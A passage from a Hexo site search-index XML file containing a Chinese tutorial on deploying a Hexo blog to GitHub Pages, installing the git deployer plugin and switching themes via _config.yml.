class="code"><pre><code class="hljs stylus">账户名<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span>(例：kaikaikai7<span class="hljs-selector-class">.github</span>.io)<br></code></pre></td></tr></table></figure><h2 id="安装插件">3.2 安装插件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cnpm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><h2 id="修改配置文件">3.3 修改配置文件</h2><ol type="1"><li><p>进入根目录下_config.yml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim _config.yml<br></code></pre></td></tr></table></figure></li><li><p>修改Deployment部分内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span> <span class="hljs-string">https://github.com/kaikaikai7/kaikaikai7.github.io.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="部署">3.4 部署</h2><p>注：页面结果以本地 <code>hexo s</code>为准，部署后的异常大部分是线上缓存原因，在确认没有报错的情况下，等待若干时间后即可正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo d<br></code></pre></td></tr></table></figure><h2 id="访问">3.5 访问</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>账户名.github.io/<br>（例：https:<span class="hljs-regexp">//</span>kaikaikai7.github.io/）<br></code></pre></td></tr></table></figure><h1 id="更换主题">4. 更换主题</h1><h2 id="主题官网">4.1 主题官网</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hexo.io<span class="hljs-regexp">/themes/</span><br></code></pre></td></tr></table></figure><h2 id="下载主题">4.2 下载主题</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> 主题地址.git themes/目录<br>（例：git <span class="hljs-built_in">clone</span> https://github.com/litten/hexo-theme-yilia.git themes/yilia）<br></code></pre></td></tr></table></figure><h2 id="修改配置文件-1">4.3 修改配置文件</h2><ol type="1"><li><p>进入根目录下_config.yml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim _config.yml<br></code></pre></td></tr></table></figure></li><li><p>修改Extensions部分内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Extensions</span><br><span class="hljs-comment">## Plugins: https://hexo.io/plugins/</span><br><span class="hljs-comment">## Themes: https://hexo.io/themes/</span><br><span class="hljs-attr">theme:</span> <span class="hljs-string">fluid</span><br></code></pre></td></tr></table></figure></li></ol><p>参考教程：</p><ol type="1"><li>https://www.bilibili.com/video/BV1Yb411a7ty/</li><li><ahref="https://cnhuazhu.top/butterfly/2021/01/21/Hexo快速搭建一个博客/">Hexo快速搭建一个博客| 花猪のBlog (cnhuazhu.top)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>博客搭建</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
